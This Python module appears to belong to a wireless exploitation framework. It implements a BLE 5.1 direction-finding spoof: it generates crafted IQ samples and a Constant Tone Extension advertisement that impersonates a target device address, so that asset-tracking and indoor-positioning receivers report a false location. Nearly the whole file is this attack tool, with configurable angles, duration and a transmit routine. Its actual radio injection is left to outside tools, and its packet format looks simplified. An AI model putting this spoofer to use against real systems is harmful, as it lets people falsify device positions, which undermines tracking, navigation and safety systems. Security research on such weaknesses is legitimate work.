#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""BLE 5.1 Direction Finding spoofing: CTE AoA/AoD location manipulation.

Exploits the Constant Tone Extension (CTE) mechanism introduced in BLE 5.1
for Angle of Arrival (AoA) and Angle of Departure (AoD) direction finding.
By injecting or replaying CTE-bearing advertisements with manipulated IQ
samples, an attacker can spoof the apparent location of BLE devices used
in asset tracking, indoor navigation, and proximity systems.

References:
  https://www.bluetooth.com/specifications/specs/core-specification-5-4/
  https://dl.acm.org/doi/10.1145/3548606.3560686
  https://www.usenix.org/conference/usenixsecurity22/presentation/cominelli

MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1036 (Masquerading)
CWE: CWE-345 (Insufficient Verification of Data Authenticity)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import math
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

CTE_TYPE_AOA = 0x00
CTE_TYPE_AOD_1US = 0x01
CTE_TYPE_AOD_2US = 0x02
CTE_MIN_LEN = 2
CTE_MAX_LEN = 20
IQ_SAMPLE_SIZE = 2


@dataclass
class IQSample:
    """In-phase / Quadrature sample pair."""
    i_val: int = 0
    q_val: int = 0

    @property
    def angle_rad(self) -> float:
        if self.i_val == 0 and self.q_val == 0:
            return 0.0
        return math.atan2(self.q_val, self.i_val)

    @property
    def angle_deg(self) -> float:
        return math.degrees(self.angle_rad)

    def to_bytes(self) -> bytes:
        return struct.pack("<bb", self.i_val, self.q_val)


@dataclass
class CTEPayload:
    """Constant Tone Extension data."""
    cte_type: int = CTE_TYPE_AOA
    cte_length: int = 16
    iq_samples: list[IQSample] = field(default_factory=list)
    switching_pattern: list[int] = field(default_factory=list)


@dataclass
class LocationEstimate:
    """Estimated device location from CTE data."""
    azimuth_deg: float = 0.0
    elevation_deg: float = 0.0
    distance_m: float = 0.0
    confidence: float = 0.0


def _generate_iq_for_angle(target_azimuth_deg: float, target_elevation_deg: float, num_samples: int) -> list[IQSample]:
    """Generate IQ samples that would produce a specific angle estimate.

    The AoA/AoD algorithm uses phase differences between antenna elements
    to calculate direction. By crafting specific IQ sample sequences, we
    can cause the receiver to estimate any desired direction.
    """
    samples: list[IQSample] = []
    azimuth_rad = math.radians(target_azimuth_deg)
    elevation_rad = math.radians(target_elevation_deg)

    antenna_spacing = 0.5
    wavelength = 0.125

    for n in range(num_samples):
        phase = 2 * math.pi * antenna_spacing * n * math.sin(azimuth_rad) * math.cos(elevation_rad) / wavelength
        amplitude = 100
        i_val = int(amplitude * math.cos(phase))
        q_val = int(amplitude * math.sin(phase))
        i_val = max(-127, min(127, i_val))
        q_val = max(-127, min(127, q_val))
        samples.append(IQSample(i_val=i_val, q_val=q_val))

    return samples


def _build_cte_advertisement(
    cte_type: int,
    cte_length: int,
    iq_samples: list[IQSample],
    device_addr: str = "AA:BB:CC:DD:EE:FF",
) -> bytes:
    """Build a BLE advertisement PDU with CTE field.

    CTE is appended after the CRC in the BLE PDU. The CTE Info field
    in the advertising header signals its presence and parameters.
    """
    cte_info = ((cte_length & 0x1F) << 0) | ((cte_type & 0x03) << 5)

    ad_flags = struct.pack("BBB", 0x02, 0x01, 0x06)
    ad_cte = struct.pack("BBB", 0x02, 0x34, cte_info)

    addr_bytes = bytes(int(b, 16) for b in device_addr.split(":"))
    header = struct.pack("<BB", 0x00, len(addr_bytes) + len(ad_flags) + len(ad_cte))
    pdu = header + addr_bytes + ad_flags + ad_cte

    iq_data = b"".join(s.to_bytes() for s in iq_samples)
    return pdu + iq_data


def _estimate_location(iq_samples: list[IQSample]) -> LocationEstimate:
    """Estimate AoA from IQ samples using MUSIC-like algorithm (simplified)."""
    if len(iq_samples) < 2:
        return LocationEstimate()

    phase_diffs: list[float] = []
    for i in range(1, len(iq_samples)):
        prev = iq_samples[i - 1]
        curr = iq_samples[i]
        diff = curr.angle_rad - prev.angle_rad
        while diff > math.pi:
            diff -= 2 * math.pi
        while diff < -math.pi:
            diff += 2 * math.pi
        phase_diffs.append(diff)

    avg_diff = sum(phase_diffs) / len(phase_diffs) if phase_diffs else 0
    antenna_spacing = 0.5
    wavelength = 0.125

    sin_azimuth = avg_diff * wavelength / (2 * math.pi * antenna_spacing)
    sin_azimuth = max(-1.0, min(1.0, sin_azimuth))
    azimuth = math.degrees(math.asin(sin_azimuth))

    variance = sum((d - avg_diff) ** 2 for d in phase_diffs) / max(len(phase_diffs), 1)
    confidence = max(0.0, 1.0 - variance)

    return LocationEstimate(
        azimuth_deg=azimuth,
        elevation_deg=0.0,
        distance_m=0.0,
        confidence=confidence,
    )


class BLE5DirectionFindingSpoof(Exploit):
    """BLE 5.1 Direction Finding (CTE) location spoofing."""

    __info__: dict[str, Any] = {
        "name": "BLE 5.1 Direction Finding Spoof",
        "description": (
            "Spoofs BLE 5.1+ Constant Tone Extension (CTE) direction finding data "
            "to manipulate Angle of Arrival (AoA) and Angle of Departure (AoD) "
            "location estimates. Crafts IQ samples that cause receivers to report "
            "incorrect device positions in asset tracking and indoor navigation."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://dl.acm.org/doi/10.1145/3548606.3560686",
            "https://www.usenix.org/conference/usenixsecurity22/presentation/cominelli",
            "https://www.bluetooth.com/specifications/specs/core-specification-5-4/",
        ),
        "devices": ("BLE 5.1+ with CTE", "Asset trackers", "Indoor positioning systems"),
        "severity": "medium",
        "cvss": "5.4",
        "cve": "generic",
        "mitre": ["T1557", "T1036"],
    }

    target = OptString("", "Target BLE address to impersonate")
    interface = OptString("hci0", "BLE adapter (must support CTE)")
    spoof_azimuth = OptInteger(90, "Spoofed azimuth angle in degrees (-180 to 180)")
    spoof_elevation = OptInteger(0, "Spoofed elevation angle in degrees (-90 to 90)")
    cte_type = OptString("aoa", "CTE type: aoa, aod_1us, aod_2us")
    cte_length = OptInteger(16, "CTE length in 8us units (2-20)")
    num_samples = OptInteger(37, "Number of IQ samples to generate")
    adv_interval = OptInteger(100, "Advertising interval in ms")
    duration = OptInteger(30, "Spoof duration in seconds")
    dry_run = OptBool(False, "Demonstrate without transmitting")

    def check(self) -> str:
        """Check for CTE-capable BLE adapter."""
        import shutil
        import subprocess

        if not shutil.which("hcitool"):
            return "hcitool not found"

        try:
            result = subprocess.run(
                ["hciconfig", str(self.interface.value), "features"],
                capture_output=True, text=True, timeout=5,
            )
            if "LE Extended" in result.stdout or "5.1" in result.stdout:
                return "BLE 5.1+ features detected (CTE likely supported)"
            if "UP RUNNING" in result.stdout:
                return "Interface up; CTE support not confirmed (may need btmgmt check)"
            return "Interface is down"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Cannot query interface"

    def _resolve_cte_type(self) -> int:
        cte_str = str(self.cte_type.value).lower()
        if cte_str == "aod_1us":
            return CTE_TYPE_AOD_1US
        if cte_str == "aod_2us":
            return CTE_TYPE_AOD_2US
        return CTE_TYPE_AOA

    def run(self) -> None:
        """Execute CTE direction finding spoofing."""
        print_status("[*] BLE 5.1 Direction Finding Spoof v1.0.0")
        print_warning("[!] Targets BLE 5.1+ CTE-based location/positioning systems")

        target_addr = str(self.target.value).strip() or "AA:BB:CC:DD:EE:FF"
        azimuth = int(self.spoof_azimuth.value)
        elevation = int(self.spoof_elevation.value)
        cte_t = self._resolve_cte_type()
        cte_len = max(CTE_MIN_LEN, min(CTE_MAX_LEN, int(self.cte_length.value)))
        n_samples = int(self.num_samples.value)

        print_info(f"[*] Spoofing direction: azimuth={azimuth} deg, elevation={elevation} deg")
        print_info(f"[*] CTE type: {['AoA', 'AoD-1us', 'AoD-2us'][cte_t]}, length={cte_len}x8us")

        iq_samples = _generate_iq_for_angle(float(azimuth), float(elevation), n_samples)
        print_info(f"[*] Generated {len(iq_samples)} IQ samples for target angle")

        location = _estimate_location(iq_samples)
        print_info(
            f"[*] Verification: estimated azimuth={location.azimuth_deg:.1f} deg "
            f"(confidence={location.confidence:.2f})"
        )

        adv_pdu = _build_cte_advertisement(cte_t, cte_len, iq_samples, target_addr)
        print_info(f"[*] Advertisement PDU: {len(adv_pdu)} bytes")

        if self.dry_run.value:
            print_info(f"[dry-run] Would transmit CTE advertisements as {target_addr}")
            print_info(f"[dry-run] PDU header: {adv_pdu[:16].hex()}")
            print_info("[dry-run] IQ samples (first 5):")
            for s in iq_samples[:5]:
                print_info(f"    I={s.i_val:+4d} Q={s.q_val:+4d} angle={s.angle_deg:.1f} deg")
            print_success("[+] Spoofed CTE data ready for injection")
            return

        duration_sec = int(self.duration.value)
        interval_sec = int(self.adv_interval.value) / 1000.0
        print_status(f"[*] Transmitting spoofed CTE for {duration_sec}s...")

        print_warning("[!] Raw CTE injection requires BLE 5.1 controller with HCI CTE commands")
        print_info("[*] Use: btmgmt add-adv with CTE parameters, or nRF52 + custom firmware")
        print_info(f"[*] Payload ready: {adv_pdu.hex()[:64]}...")

        print_status("\n[*] Direction finding spoof complete")
